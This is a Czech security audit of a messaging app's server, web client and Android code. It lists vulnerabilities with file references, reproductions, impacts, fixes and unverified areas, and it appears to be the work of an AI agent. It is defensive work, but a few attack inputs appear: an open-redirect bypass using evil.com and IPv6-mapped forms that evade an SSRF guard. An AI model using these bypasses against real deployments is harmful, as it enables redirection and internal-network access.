**S5 — Neomezená mapa „away" v relay** — potvrzeno, reprodukováno
- Kde: `server/signaling/relay.ts:119-125` `setAway` (volané z `onLeave`, `:199-204`); úložiště účtu má limit 20 místností (`accounts/store.ts:925-931`), relay ne.
- Reprodukce (`scratchpad/core/away-growth.ts`): 10 000× join+leave(away) → `store: 20 | relay in-memory away: 10000`.
- Dopad: libovolný registrovaný účet nafukuje paměť (~5 místností/s na socket) a každým krokem spouští zápis `accounts.json` (viz N2).
- Oprava: `maxAwayRooms` vynutit i v `AwayRelay.setAway` (vyhodit nejstarší).

**S6 — Produkční statika vrací 404, když cesta instalace obsahuje adresář s tečkou** — potvrzeno, reprodukováno
- Kde: `server/static.ts:46` `res.sendFile(file + suffix)` (předkomprimované assety, tj. pro každý prohlížeč s `br`/`gzip`) a `:73` `res.sendFile(path.resolve(distPath, "index.html"))`; totéž `server/admin.ts:279,297`. `send` bez `root` posuzuje dotfiles na **celé absolutní cestě** (výchozí `ignore` → 404).
- Reprodukce: `scratchpad/me/dotfile.mjs` — stejný soubor `/…/plain/…` → 200, `/…/.hidden/…` → 404, s `{ dotfiles: "allow" }` → 200. Probe produkčního buildu ve worktree `…/.claude/worktrees/…`: prázdná stránka, konzole plná `404` a „Refused to apply style … MIME type text/html".
- Dopad: instalace pod `~/.něco/`, `/opt/.m5cet/` apod. má nefunkční aplikaci i konzoli; **právě proto padá 53 E2E testů v agentních worktree** (`.claude/worktrees`) — ze stejného stromu mimo tečkový adresář prošlo 72/72.
- Oprava: `res.sendFile(name, { root: distPath, dotfiles: "allow" })` (relativní jméno + `root`; kontrola `..` zůstává), totéž v `admin.ts`; test, který spustí `serveStatic` z adresáře s tečkou.

**S7 — Anonymní relace úložiště zaplní disk** — potvrzeno (kód), objem neměřen
- Kde: `server/storage/service.ts:76-81` (16 MB na relaci, 30 nových/h na klienta, 5000 živých), expirace `:46-48` (24 h po aktivitě, max 7 dní); globální rozpočet bajtů chybí.
- Dopad: jedna IP za ~týden 5000 × 16 MB ≈ 80 GB; po dosažení 5000 nové anonymní relace nikdo nezaloží; plný disk navíc spouští N7.
- Oprava: globální diskový rozpočet, limit živých relací na klienta, menší kvóta.

**S8 — Globální strop 5000 účtů = trvalé zablokování registrace** — potvrzeno (kód)
- Kde: `server/accounts/store.ts:50` `maxAccounts: 5000`, `:488` `"account store full"`; registrace jen 30/10 min/IP (`accounts/routes.ts:169-175`), softwarový autentizátor projde, nepoužité účty neexpirují.
- Oprava: expirace nikdy neodemčených/nečinných účtů, konfigurovatelný strop, pozvánka nebo proof-of-work, alert u stropu.

**S9 — Audit journal lze bez přihlášení zahltit (a podvrhnout aktéra)** — potvrzeno (kód)
- Kde: `server/message-audit.ts:83-103` — až 50 záznamů na požadavek, aktér `guest:<client>` volí volající; journal drží posledních 200 000 (`server/storage/global-store.ts:119`).
- Dopad: pár IP vytlačí skutečné bezpečnostní události (prořez podle počtu), atribuce je padělatelná.
- Oprava: zápis jen s tokenem/relací, kvóty po kategoriích, kategorie `security`/`admin` neprořezávat počtem.

**S10 — Android: pokus o PIN se započítá až po pomalé derivaci klíče** — potvrzeno (kód)
- Kde: `security/AppLock.java:68-76` `unlockWithPin` → `vault.unlockWithPin` (PBKDF2 210k + Keystore HMAC, `security/Vault.java:124-139`) a teprve pak `failed()` → `save()` (`:87-112`); vše na UI vlákně (`ui/parts/LockPad.java:124` → `ui/MainActivity.java:304`).
- Dopad: zabití procesu během derivace (Recents, force stop) pokus nezapočte → obchází se backoff i wipe-after-N, online hádání 4–6místného PINu je možné; na pomalých zařízeních jank/ANR.
- Oprava: před derivací perzistovat „rozpracovaný" pokus (`attempts+1`), po úspěchu vynulovat; derivaci na pozadí.

**S11 — Android: notifikace ukazují plaintext, dokud se aplikace nevrátí do popředí** — potvrzeno (kód)
- Kde: `chat/Rooms.java:310` `hideContent = app.lock.isLocked()`; `security/AppLock.java:46` `isLocked() = uiLocked || !vault.unlocked()`, `uiLocked` se nastaví jen v `onForeground()` (`:147-153`); `telecom/Notify.java:126-141` posílá text a odesílatele s `VISIBILITY_PRIVATE` bez public verze, přímá odpověď bez ověření (`telecom/ReplyReceiver.java:20`).
- Dopad: po odemčení a odchodu do pozadí jde text zpráv na zamčenou obrazovku (pokud uživatel globálně neskryl citlivý obsah); kdo drží telefon, odpoví do místnosti.
- Oprava: auto-lock podle času i na pozadí (`isLocked()` = `backgroundSince + autolock`), `setPublicVersion()` s redigovaným textem, `setAuthenticationRequired(true)` (API 31+) u odpovědi.

**S12 — Android: vzdálené smazání nechá proces a zbytky** — potvrzeno (kód)
- Kde: `security/Wiper.java:28-63` maže soubory a Keystore, ale neruší notifikace, dynamické/long-lived zkratky (názvy místností), `CallService`/`LocationService`, HCE kartu (`CardService`), ani cache `Config`/systémového klíče v paměti; proces restartuje jen listener aktivity (`ui/MainActivity.java:628`).
- Oprava: ve `wipe()` `cancelAll()`, `removeAllDynamicShortcuts()`/`removeLongLivedShortcuts()`, zastavit služby, `CardService.serve(null)`, vyčistit cache a vždy `killProcess()`.

**S13 — Android: Argon2 alokuje 64 MiB na místnost, odvození běží souběžně** — ověřit na zařízení
- Kde: `chat/Argon2.java:25`, `chat/RoomKeys.java:18,59`, `chat/Rooms.java:92,227-233`, `chat/RoomSession.java:51-55,94-99,119-134`. Až 8 (policy 16) místností současně → `OutOfMemoryError`, chycený jako `Throwable` v `post()` (`chat/RoomSession.java:97`) — retry v `connect()` se nespustí, místnost visí v „connecting".
- Oprava: semafor 1–2 derivace, cache odvozených seedů v uživatelském trezoru, OOM jako opakovatelná chyba.

**S14 — Android: design bundle vidí `$form` včetně PINu při nastavení** — návrhové riziko, ověřit
- Kde: `ui/MainActivity.java:443` dává `$form` do každého scope, včetně `pin1` při nastavení PINu (`:282`); akce `url.open`, `share`, `copy`, `fn.run` (`ui/Actions.java:76-79`).
- Dopad: serverem podepsaný bundle může vykreslit falešnou výzvu na heslo místnosti a vstup odeslat ven — E2E vůči operátorovi je jen tak silné jako důvěra v bundle (a tu oslabuje V6).
- Oprava: PIN/heslo/join jako nativní sloty mimo `$form`, na zamykací a enrolment obrazovce `$form` nevystavovat, před `url.open` ukázat cíl.

**S15 — Android: „ověřená" zpráva není vázaná na připnutý klíč odesílatele** — ověřit proti významu v UI
- Kde: `chat/RoomSession.java:429` `m.verified = opened.signer != null && opened.signer.valid && !p.changed` — podpis libovolným vloženým klíčem (`chat/Envelopes.java:73-78`), bez porovnání s `p.publicKey`; jméno se bere z payloadu (`chat/Payloads.java:94`); relay cesta TOFU nepoužije.
- Dopad: člen místnosti pošle zprávu pod cizím jménem, a přesto „ověřenou".
- Oprava: `signer.publicKey == p.publicKey`, u relay dohledat pin podle klíče, zobrazovat připnuté jméno.

**S16 — Referenční nginx nesměruje `/hooks/` a `/fn-sandbox.html`; jeho CSP blokuje rámce** — potvrzeno (konfigurace), produkci ověřit
- Kde: `deploy/nginx/m5cet.conf` má lokace jen pro `/assets/`, `/`, `/api/…`, `/ws`, `/wh/`, `/admin/`, `/console/` aj.; `/hooks/…` (webhooky Funkcí, `server/functions/routes.ts:333-438`) a `/fn-sandbox.html` (`server/functions/sandbox-page.ts:88`) spadnou do `location /` → `try_files … /index.html`. CSP statiky (`:118`) má `child-src 'none'` bez `frame-src`, takže i iframe sandboxu (`client/src/components/fn/FnSandbox.tsx:70`) je zakázaný.
- Dopad: za referenční proxy nefungují webhooky modelů ani prohlížečový kód funkcí (`m5.browser.run`).
- Oprava: `location /hooks/` a `location = /fn-sandbox.html` → proxy na aplikaci; do CSP `frame-src 'self'` (jako `server/index.ts:184`).

**S17 — Web: historie hosta „ze serveru" přijme nezapečetěné řádky doslova** — potvrzeno (přijetí), běh skriptu v `blob:` ověřit
- Kde: `client/src/lib/chat-history.ts:202` `if (!row || row.sealed !== 1) return value;` → `App.tsx:2792-2793` → `sanitizeRestored` (`chat-history.ts:88-104`) objekt jen rozprostře: žádné `validateAttachment`/`sanitizeFnOutputs`, `identity` i `mine` zůstanou.
- Dopad: server (útočník v modelu hrozeb E2E) vloží do historie falešné zprávy libovolného odesílatele s `identity:{state:"verified"}`, výstupy `js` (viz V2) nebo přílohu `text/html`, kterou `MessageInfoModal.tsx:119-126` otevře jako `blob:` stránku stejného originu (phishing; inline skript by měla zablokovat zděděná CSP).
- Oprava: nezapečetěné řádky zahodit, obnovené zprávy znovu validovat, `identity`/`mine` přepočítat.

**S18 — Web: kolize `keyId` sender-key zablokuje zprávy jiného člena** — potvrzeno, reprodukováno (`scratchpad/web/sk.mts`)
- Kde: `client/src/lib/sender-keys.ts:233-234` mapa řetězců klíčovaná jen `keyId`; `:281` pak odmítne, když `chain.owner !== from`. `keyId` (`envelope.sk`) putuje v otevřené obálce.
- Dopad: člen pošle sender-key se stejným id jako Alice → oběť nedešifruje Aliciny živé zprávy až do rotace (500 zpráv / 1 h).
- Oprava: klíčovat `from|keyId`; při selhání požádat odesílatele o znovuzaslání řetězce.

**S19 — Web: odesílatel souboru není vázaný na transportního peera** — potvrzeno (kód)
- Kde: `client/src/lib/file-transfer.ts:707` bere `m.senderId` bez kontroly rezervovaných id, `App.tsx:2288-2289` ho použije (chat to dělá správně: `validate.ts:166-171`). Se `senderId:"system"` se soubor vykreslí jako systémová zpráva aplikace s libovolným 200znakovým názvem (`App.tsx:404`).
- Oprava: předat id kanálu/relay peera do `handleIncomingFrame`, vyžadovat shodu s `meta.senderId`, rezervovaná id odmítnout.

**S20 — Web: paměťové DoS a neomezený růst** — potvrzeno čtením, nezátěžováno
- Kde: výchozí `maxAttachmentBytes: Number.MAX_SAFE_INTEGER` (`client/src/lib/preferences.ts:254`), celý soubor v RAM; `MIN_CHUNK = 1` a `MAX_TOTAL_CHUNKS = 2_000_000` (`file-transfer.ts:217-219`) → každá meta alokuje dvě pole až 2M položek (`:763-772`); bez limitu souběžných přenosů a bez nečinnostní expirace; bloby se uvolní jen ručním smazáním (`App.tsx:2280-2281,3834`); pole zpráv bez stropu; `file-cancel` neautentizovaný (`file-transfer.ts:843-847`) — zruší kdokoli z peerů nebo server na proxy transportu.
- Oprava: rozumný výchozí limit velikosti, minimální chunk ~16 KiB, limit souběžných přenosů na peera + timeout, velké soubory streamovat do OPFS, strop seznamu zpráv a uvolnění blobů, cancel rámce pečetit klíčem souboru.

**S21 — Web: název místnosti v čitelné podobě stále jde na server** — potvrzeno (kód)
- Kde: `client/src/App.tsx:2790` `readServerMessages({ room: nextRoom }) // written by 3.0 under the plain name` při každém připojení hosta s retencí na serveru; dále `App.tsx:2978` (analytika, opt-in) a `:3651/3726/3753` (funkce, `room: room || null`).
- Oprava: zrušit kompatibilní čtení z 3.0, posílat `keys.roomId`.

### Nízká

| # | Nález | Kde | Oprava |
|---|---|---|---|
| N1 | Kvóta na odesílatele ve frontě obejitelná (anonymní `peerId` se mění/volí) — zahlcení schránky nepřítomného člena (1000 položek / 8 MB) | `server/accounts/mailqueue.ts:252`, `hub.ts:573-575` | klíčovat anonymní odesílatele IP//64, limit na místnost |
| N2 | Každý zápis `accounts.json` synchronně přepíše celý soubor; 5000 účtů × 300 auditních záznamů = 122 MB, blokace smyčky 282–316 ms (změřeno, `scratchpad/core/persist-cost.mjs`) | `server/accounts/store.ts:365-376` | účty/relace/audit do SQLite nebo zápis po účtech |
| N3 | Odešlý člen: jeho `peerId` si vezme kdokoli (resume se kontroluje jen u živého držitele) → příjem potvrzení, převzetí TOFU stavu (mezera č. 6) | `server/signaling/hub.ts:573-575` | držet `resumeHash` po dobu odkladu |
| N4 | `maxMembers` místnosti obejitelný — „returning" se uzná bez resume tajemství | `hub.ts:549` | uznat až po úspěšném resume |
| N5 | Jedna IP obsadí všech 64 slotů file-proxy; `seqs` Set až 1M položek na přenos | `server/file-proxy.ts:23-24,57-63,100` | limit na IP, čítač místo Setu |
| N6 | Pomalý konzument smí držet až 32 MB bufferu; heartbeat bere jako živý jakýkoli příchozí rámec | `hub.ts:88-90,295-305,412` (ověřit) | ~4 MB pro ne-proxy provoz, rozpočet na IP |
| N7 | Časovače bez try/catch a žádný `process.on("unhandledRejection")` — `SQLITE_FULL/BUSY` při sweepu fronty = pád procesu | `server/routes.ts:177-180`, `server/storage/backup.ts:69-72`, `server/telephony/bridge.ts:518` | try/catch + logující handler |
| N8 | Zprávy clusteru bez `CLUSTER_SECRET` nepodepsané (jen varování), podepsané bez nonce/času → replay | `server/cluster/bus.ts:209-213` | bez tajemství nestartovat, čas + okno |
| N9 | Adresa klienta na WS se liší od Express trust proxy (věří XFF z libovolné privátní adresy, veřejné položky seznamu ignoruje) | `hub.ts:114-129` | použít `proxy-addr` se stejnou funkcí důvěry |
| N10 | `/metrics` je mimo `/api` → bez rate limitu a přijímá **jakýkoli** admin token včetně `ADMIN_API_TOKEN` libovolné délky → neomezené online hádání (instalátor generuje 32 B hex — `installer/lib/deploy.sh:98`; za referenčním nginx `/metrics` neprojde, v Docker/PaaS ano) | `server/routes.ts:264-271`, `server/admin-users.ts:107-111` | limiter odmítnutých pokusů jako u `/api/admin`, minimální délka tokenu |
| N11 | Webhooky telefonie: Vonage SMS bez parametru `sig` se přijmou i s nastaveným `VONAGE_SIGNATURE_SECRET`; bez ověřovacího materiálu se přijímá vše (záměr, dokumentováno `webhooks.ts:14-17`); Vonage JWT bez `exp`/`payload_hash` platí navždy a neváže tělo | `server/telephony/webhooks.ts:244`, `:152-157`, `server/telephony/jwt.ts:67-68` | se secretem `sig` vyžadovat; `iat/exp` povinné + okno; `payload_hash` povinný |
| N12 | Android `/events`: nonce se drží 10 min, ale časová tolerance je 30 dní → replay podepsaného požadavku (idempotentní díky id událostí); nonce se zapisuje před ověřením podpisu | `server/android/routes.ts:31-40,78-80` | pamatovat nonce po celé okno nebo vázat na id události; nonce až po podpisu |
| N13 | SSRF guard Funkcí nezná hex tvar IPv4-mapped (`::ffff:7f00:1`) ani NAT64 `64:ff9b::/96` — **dnes nedosažitelné**: `URL.hostname` drží hranaté závorky a DNS selže (`scratchpad/me/ssrf.mts`: všechny IPv6 literály → „cannot resolve"); IPv6 literály tedy nefungují vůbec | `server/functions/host-net.ts:39-48,57-61` | normalizovat IPv6, vyhodnotit vloženou IPv4 (`::ffff:0:0/96`, `64:ff9b::/96`, `2002::/16`), stripovat závorky |
| N14 | Odpověď na interaktivní běh (`m5.prompt/form`) nevázaná na volajícího (zmírněno ~96 bity náhodných id) | `server/functions/routes.ts:294-308` | vázat na relaci/volajícího |
| N15 | Regex `pattern` vstupů (od operátora) běží na hlavní smyčce nad až 1 MB vstupem | `server/functions/inputs.ts:45-48` | omezit délku, stejná ochrana jako S1 |
| N16 | KV úložiště funkcí (session/cache) bez limitu velikosti hodnoty a počtu klíčů | `server/functions/store.ts:316-340` | limity bajtů a klíčů na scope |
| N17 | Watchdog RSS sandboxu funguje jen na Linuxu (`/proc`) | `server/functions/sandbox/pool.ts:263-272` | multiplatformní zdroj RSS |
| N18 | Android — menší: dialogy bez `FLAG_SECURE` (MRZ/CAN `ui/parts/NfcWorkbench.java:1152`, heslo Wi-Fi `:459`, safety number `ui/parts/People.java:325`, změna PINu `ui/parts/Parts.java:145`); změna PINu bez starého PINu (`ui/parts/Parts.java:145-150`); backoff podle hodin systému (`security/AppLock.java:51-55`); neúspěšný otisk prstu se počítá do wipe (`ui/MainActivity.java:326-329`); rekurze TLV bez limitu hloubky → `StackOverflowError` (`nfc/Apdu.java:151-172`, ověřit); BAC přeskočí MAC, chybí-li DO'8E (`nfc/Bac.java:205`); počet iterací Sealed od protistrany (`chat/Sealed.java:73`); NFC karta se 4místným PINem a PBKDF2 (`nfc/Nfc.java:73,245-249`); názvy místností v logu, který příkaz „status" pošle serveru (`chat/RoomSession.java:129,282`, `push/Control.java:69-70`); WebSocket bez timeoutu před upgradem (`net/WebSocket.java:70-87`); `CallService` se zastaví jen akcí `call.end` (`ui/Actions.java:63`); nečitelný záznam trezoru → prázdný → nová identita (`security/Vault.java:222-230`, ověřit); tiché aktualizace `USER_ACTION_NOT_REQUIRED` (`update/Releases.java:126`) a 80/400 MB v paměti (`net/Server.java:175-184`); žádná ochrana proti downgradu bundlu (`update/Bundles.java:205-219`); debug a release sdílejí `applicationId`, debug věří uživatelským CA (`build.gradle.kts:57-60`); USB permission receiver exportovaný pod API 33 (`nfc/UsbReader.java:96`) | viz sloupec vlevo | jednotlivě dle popisu |
| N19 | `npm audit`: `ip-address` (high, přes `express-rate-limit`), `qs` (moderate, nedosažitelné) → `npm audit fix`; dev řetěz tailwind 3 → braces | `package-lock.json` | `npm audit fix`; tailwind 4 až při plánované migraci |
| N20 | CI nespouští Android build/testy/lint ani `npm audit`; lint má navíc 12× `RestrictedApi` (`getType`/`getErrorMessage` výjimek Credential Manager) | `.github/workflows/ci.yml`, `account/Passkeys.java:54-76` | Android job (`testDebugUnitTest`, `lintDebug`), `npm audit --omit=dev --audit-level=high` |
| N21 | `command-poll`: socket, který zná `deviceId`, vybere jeho operátorské příkazy | `hub.ts:509-512` | vázat na doklad zařízení |

Webový klient — nízké:

| # | Nález | Kde | Oprava |
|---|---|---|---|
| N22 | Kontrola „cesta na tomto webu" propustí `/\host` (`new URL("/\\evil.com/x", origin)` → `https://evil.com/x`) — open redirect z push/layoutu/menu (zdroje řídí server/operátor) | `client/public/sw.js:33`, `client/src/lib/layout-tree.ts:357`, `menu-template.ts:760-761`, `menu-config.ts:306`, `App.tsx:985` | odmítnout zpětné lomítko, nebo `new URL` + porovnat origin |
| N23 | TOFU piny: drží se nejnovějších 2000 podle `lastSeen` → po 2000 jednorázových jménech lze cizí jméno převzít jako „new"; poprvé viděný klíč se ukáže jako „verified" | `client/src/lib/identity.ts:290-295`, `App.tsx:1567-1576` | strop na místnost, vyhazovat jen staré, „nový" zobrazovat zvlášť |
| N24 | Sloty trezoru (profil, chat, spojení, registrace) šifrované AES-GCM bez AAD a bez verze → server může sloty prohodit nebo vrátit starší (např. vrátit smazaná spojení) | `client/src/lib/passkey.ts:129-143`, `account.ts:546-587` | AAD `vault:<slot>:<účet>` + monotónní `savedAt` uložené lokálně |
| N25 | IV mediálních rámců = 4 B náhodné soli + čítač od 0, klíč deterministický pro pár a místnost → ~2⁻³² šance opakování nonce mezi relacemi; bez forward secrecy nad DTLS | `client/src/lib/media-frames.ts:34-41`, `sender-keys.ts:177-188`, `media-e2ee.worker.ts:66-67` | do HKDF soli přimíchat náhodné nonce z hello |
| N26 | HTML výstup funkce smí `margin-top:-500px; width:100vw; height:100vh` a `.fn-html__body` neořezává → překrytí jiných zpráv (UI redress) | `client/src/lib/fn-html.ts:33-39`, `client/src/components/fn/fn.css:125-127` (ověřit vizuálně) | `overflow:hidden; contain:paint`, zakázat záporné okraje a viewport jednotky |
| N27 | Kontrola DTLS otisku je neúčinná (klíč `peerId`, hodnota se vždy přepíše) a `m5cet:fingerprints:v1` roste bez konce jako čitelný log kontaktů (souvisí s mezerou č. 6 a N3) | `client/src/App.tsx:2539-2540`, `client/src/lib/fingerprint.ts:119-145` | odstranit, nebo klíčovat identitním klíčem a prořezávat |
| N28 | Metadata v čitelném `localStorage`: názvy místností a jména v pinech, `roomSecurity`/`roomTtl` podle názvu místnosti, úložiště otisků; trezor chatu drží `sealPlain`/`sealCode` vedle sebe | `identity.ts:299`, `chat-history.ts:44` | klíčovat hashem, šifrovat |
| N29 | NFC záznam `url-login` se otevře `window.open(url, "_blank", "noopener")` bez kontroly schématu | `client/src/components/M5CardPanel.tsx:173` (ověřit `javascript:`) | povolit jen `https:` |
| N30 | WebNFC `scanOnce` po timeoutu nikdy nevyřeší promise → UI visí | `client/src/lib/nfc.ts:86,93-111` | resolve/reject při abortu |
| N31 | Systémové notifikace prohlížeče ukazují plaintext, když je karta skrytá | `client/src/App.tsx` ~2488-2491 | volba „skrýt obsah" |
| N32 | Replay guard obálek je jen v paměti → po reloadu může server znovu doručit relayované obálky | `client/src/lib/envelope.ts:314`, `App.tsx:2451` | perzistovat viděná id (okno) |

### Info

- **I1 — AI a řeč:** obsah volání se ukládá jen se zapnutým „content logging" vlastníka (`server/ai/journal.ts:1-10`); dostupnost pro hosty řídí skupiny (`server/ai/routes.ts:40-55`), limiter 60/5 min/IP (`:32-38`) — náklady při povolení hostům hlídat limity. Logy pluginů nesou jen metadata (`server/plugins/log.ts:3`).
- **I2 — Telefonie:** odchozí SMS/hovory jen s právem modulu a číselnými pravidly `number:+420*` (`server/telephony/routes.ts:54-56`), limiter 10/10 min/IP (`:35-43`) — při povolení skupině `guest` hrozí toll fraud.
- **I3 — Konzole:** admin process ověřuje cizí tokeny přes `/api/admin/whoami` s cache 60 s (`server/admin.ts:125-141`) → odvolání tokenu se v konzoli projeví až do minuty; passkey relace jsou jen v paměti (restart = odhlášení).
- **I4 — Android server:** podpisový klíč bundlů je nešifrovaný PKCS#8 PEM v `DATA_DIR` s právy 0600 (`server/android/store.ts:154-171`) — patří do zálohy klíčů, ne do běžné zálohy.
- **I5 — Stav ztracený restartem** (core): sdílecí odkazy, anonymní push odběry, nastavení zařízení a souhlasy, ring událostí, fronta admin příkazů, WebAuthn challenge, recovery tikety, proxy přenosy, MemoryQueue bez SQLite, klíče otevřených databází účtů, čítače rate-limitů (MemoryStore, v clusteru per instance). Přežije: `accounts.json`, `sessions.json`, SQLite fronta, away stav (20 místností/účet), `signaling.secret`.
- **I6 — Ostatní:** výchozí STUN je Google (`server/turn.ts:49`); `/register/check` je dokumentovaný orákl e-mailu/telefonu (20/10 min/IP); `/api/push/status` a `/api/account/status` prozrazují počty; bez `WEBAUTHN_ORIGINS` se přijme libovolná https subdoména rpId (`server/accounts/webauthn.ts:76-82`); odebrání účtu nevyžaduje novou autentizaci; challenge mapa se nad 10k celá vyprázdní (`accounts/routes.ts:85`); proxy dlaždic mapy je veřejná s neomezenou diskovou cache (`server/map-tiles.ts:63-113`).

## 4. Stabilita — shrnutí

- **Znovupřipojení:** web má full-jitter backoff do 120 s (`client/src/App.tsx:2699-2719`, `room-hub.ts:155-160`); server při restartu zavře sockety a klienti obnoví relaci (`server/index.ts:279-301`); Android WebSocket nemá timeout před upgradem (N18).
- **Backpressure:** proxy rámce 8 MB, tvrdé ukončení 32 MB (`hub.ts:88-90,295-305`) — N6; admin forward čeká na `drain` (`server/admin.ts:85-87`).
- **Restart:** co se ztratí a co přežije — I5.
- **Růst paměti/disku:** V4, S5, S7, S9, N2, N16, S20 (klient); ringy monitoru a auditu jsou omezené.
- **Únik zdrojů:** V3 (sloty), S3 (visící sockety), N5 (file-proxy); časovače jádra jsou `unref`.
- **Pády:** N7 (časovače bez try/catch, žádný `unhandledRejection` handler); Android V5, S13, N18 (`StackOverflowError` v TLV, `CallService`).

## 5. Stav tabulky „Známé mezery" (`docs/security-model.md:364-387`)

| # | Mezera | Stav v 6.7 | Důkaz |
|---|---|---|---|
| 1 | rate limit WS upgradu se nespustí | **opraveno, ale s novou chybou** | `ConnectionGate` v upgrade handleru (`hub.ts:260-272`, `limits.ts:114-170`); únik slotů V3, cizí cesty S3, IPv6 bez seskupení |
| 2 | `trust proxy` | opraveno | `server/trust-proxy.ts`, `index.ts:47`; WS vrstva se odchyluje (N9) |
| 3 | push/test a retence bez autentizace | opraveno | `push-routes.ts:77-97`, `retention-routes.ts:62-78` |
| 4 | statické TURN údaje | částečně | efemérní HMAC s `TURN_SECRET` (`turn.ts:57-65`); statické údaje stále přijaté s varováním (`routes.ts:342-344`), `/api/turn` veřejné |
| 5 | proxy relay nedoručuje | opraveno | `file-proxy.ts:94-104`; nové N5 |
| 6 | TOFU klíčované náhodným `peerId` | **trvá** | `client/src/lib/fingerprint.ts:119-145`; N3 ho činí zneužitelným, N27 |
| 7 | otisk místnosti = SHA-256(room id) | **trvá** | `client/src/App.tsx:2811` |
| 8 | CSP `unsafe-inline unsafe-eval` | opraveno pro produkci | `index.ts:173`; `style-src 'unsafe-inline'` zůstává (`:176`) |
| 9 | admin služba bez Helmetu a limitu | z velké části opraveno | ruční hlavičky a CSP (`admin.ts:163-169`), limiter odmítnutých (`admin.ts:190`) |
| 10 | dialog stahování ukazuje jen název | **trvá** | `client/src/App.tsx:2930` (URL omezená na stejný origin nebo https, `:2928-2929`, origin se nezobrazí) |

## 6. Co jsem neověřil

- **Zařízení:** nic neběželo na skutečném Androidu ani v emulátoru. Pád na API 29–32 (V5) je doložen lintem a bytecodem, ne spuštěním; časové okno S10, OOM Argon2 (S13), hloubka rekurze TLV, chování `InstallReceiver` a foreground služeb na Androidu 14+ — ověřit na zařízení.
- **Skutečné karty:** EMV/e-ID/PACE jen proti testovacím vektorům v unit testech; reálná karta, čtečka USB/Bluetooth a WebNFC netestovány.
- **Skuteční poskytovatelé:** Twilio/Telnyx/Vonage webhooky, odchozí SMS/hovory, AI poskytovatelé, FCM a Web Push — jen čtením kódu, bez živých účtů.
- **Produkce (`chat.fir.ma`):** skutečná nginx konfigurace (S16, N10), hodnoty `TRUST_PROXY`, `WEBAUTHN_ORIGINS`, `CLUSTER_SECRET`, `TURN_SECRET`, `METRICS_TOKEN`, velikost haldy a disku (časy V4/S7 jsou odhady).
- **V2 na serveru:** co konkrétní nasazené modely udělají s událostí pod tokenem oběti.
- **V1 zápis:** reprodukováno čtení souboru hostitele; zápis a spuštění procesu jsem nezkoušel (`child_process` je stubovaný, `node:fs` ne). Kompatibilitu Pyodide s `--permission`/`--disallow-code-generation-from-strings` ověřit při opravě.
- **Prohlížeče:** zda se inline skript spustí v `blob:text/html` (S17) a `javascript:` přes `window.open(…, "noopener")` (N29) — neověřeno v jednotlivých prohlížečích.
- **Závislosti Androidu:** CVE pro Gradle závislosti nedohledány offline (OWASP dependency-check doporučen).
- **Hloubka:** ~140 tis. řádků kódu jsem prošel po rizikových cestách (autentizace, vstupy, krypto, limity), ne řádek po řádku; generované design soubory Androidu (`server/android/design-*.ts`) a i18n moduly jsem nečetl.

## 7. Jak byly nálezy ověřeny

Reprodukční skripty (mimo repozitář, ve scratchpadu auditu):
`me/redos.mjs` (S1), `me/dotfile.mjs` a `me/probe.mjs` (S6), `me/ssrf.mts` (N13),
`me/pyescape.mts` (V1), `me/dexscan.sh` (V5), `core/gate-leak.ts` (V3),
`core/settings-heap.mjs` (V4), `core/upgrade-hang.ts` (S3), `core/away-growth.ts` (S5),
`core/persist-cost.mjs` (N2), `web/xss.mts` (V2, sanitizer), `web/sk.mts` (S18),
`web/pins.mts` (N23). V1, S1, S6, V5 a N13 jsem napsal a spustil sám; V3, S3 a S5 jsem po dílčích revizích spustil znovu se stejným výsledkem. Dílčí revize (server-jádro, web, Android, Funkce) proběhly paralelně; jejich nálezy jsem před zařazením ověřil v kódu, u N13 jsem závažnost snížil (původně „vysoká") na základě vlastního testu.

## Opraveno v 6.7 (Android)

Opravy nálezů Androidu z tohoto auditu a nálezů F-01 / F-16 z `docs/security-analysis.md`.
Ověření na konci: `./gradlew :app:testDebugUnitTest :app:assembleDebug :app:lintDebug` →
**358 JVM testů (52 sad), 0 chyb**; `lintDebug` **0 chyb** (bylo 30), 104 varování; APK sestaveno.
Serverové části: `npx vitest run test/android-*.test.ts` zeleně, `npx tsc --noEmit` čisté.
Na skutečném zařízení (Android 10–12 ani Fold6) **neověřeno**.

| Nález | Oprava | Commit | Důkaz |
|---|---|---|---|
| **V5** pád na Androidu 10–12 | `InputStream.readAllBytes` → `core/Streams.readAll` (obrázek z webu max. 16 MB); okna/insety/světlé lišty přes `ui/SystemBars` (API 30, jinak systémové UI flagy); `InstallReceiver` typované `getParcelableExtra` až od 33; `pushDynamicShortcut` od 30, jinak `addDynamicShortcuts`; `getCurrentLocation` od 30, na 29 `requestSingleUpdate` (20 s); `LocationListener` implementuje `onStatusChanged` (do API 30 abstraktní → `AbstractMethodError`); `Passkeys` bez interních `getType()/getErrorMessage()` (12× RestrictedApi); USB receiver neexportovaný i pod API 33 (`ContextCompat`, část N18) | `b0b77407` | lint 30 → 0 chyb; `StreamsTest`, `PasskeysTest.domErrorClassNames` |
| **V6** (F-05) pin klíče serveru | `security/ServerPin`: klíč musí být P-256 SPKI, `kid` ze serveru musí být jeho vlastní, každý pin (build `m5.serverKey`, `kid` z QR) musí označovat **klíč** (kid / otisk / SHA-256); `/enroll` musí vrátit tentýž klíč jako `/info`; `Config.enrolled` odmítne cizí kid; otisk v O aplikaci se počítá z klíče | `76c472e8` | `ServerPinTest` (podvržený server s očekávaným kid odmítnut) |
| **S10** pokus o PIN | `security/LockCounter`: pokus se zvýší, označí „pending" a **uloží před** PBKDF2/Keystore; neuložený = nekontrolovaný; zabití aplikace během derivace pokus nezruší, další pokus ho nejdřív započte jako chybný (čekání / zámek / wipe); správný PIN na posledním pokusu nemaže | `e6b9ce09` | `LockCounterTest` (zabíjení pokaždé dojde k wipe, počítá se jednou) |
| **S11** plaintext v notifikacích | `AppLock.isLocked()` je pravda i **na pozadí** po uplynutí auto-locku (ne až po návratu); `Notify.message`: zamčeno → jen „název aplikace / Nová zpráva", bez odesílatele, názvu místnosti, zkratky a odpovědi; vždy neutrální `setPublicVersion`; odpověď s `setAuthenticationRequired` (API 31+) | `e6b9ce09` | `LockCounterTest.autolockAppliesInTheBackground` |
| **S12** neúplný wipe | `Wiper.teardown` (každý wipe): `cancelAll()` notifikací, dynamické i long-lived zkratky pryč, připnuté přejmenované a zakázané, stop `CallService`/`LocationService`, `CardService.stopServing()`, zrušené joby; vzdálený wipe: hlášení (max 8 s), `finishAndRemoveTask()` (pryč z posledních aplikací) a `killProcess` | `01fea3a1` | sestavení; chování na zařízení ověřit |
| **S13** Argon2 souběžně | férový zámek kolem `Argon2.argon2id` — jedna derivace (64 MiB) najednou | `afa145ec` | `Argon2SerialTest` (6 vláken, souběh 1), `InteropTest` (RFC 9106 / hash-wasm) beze změny |
